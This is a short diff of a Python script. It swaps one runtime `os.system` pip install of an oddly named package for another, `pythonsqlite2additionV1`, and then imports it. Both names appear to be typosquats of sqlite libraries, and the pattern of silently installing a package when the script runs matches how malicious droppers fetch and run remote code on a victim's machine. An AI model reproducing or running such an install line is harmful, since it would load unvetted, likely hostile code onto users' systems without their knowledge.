@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlite3liberyV2")
-import pipsqlite3liberyV2
+os.system("pip install pythonsqlite2additionV1")
+import pythonsqlite2additionV1
 import random
 import requests
 import time
